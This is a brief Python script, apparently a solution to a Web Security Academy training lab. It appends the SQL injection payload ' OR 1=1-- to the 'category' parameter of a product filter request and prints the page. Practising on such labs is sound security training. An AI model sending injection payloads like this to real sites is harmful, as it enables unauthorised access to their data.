import requests

# Parâmetro vulnerável: category

# PAYLOAD
sqli_1 = "' OR 1=1--"

url = 'https://0a22000404bf4746c9fd1412006c006b.web-security-academy.net/filter'
params = {
    "category": "Lifestyle" + sqli_1
}
response = requests.get(url, params=params)

print(response.text)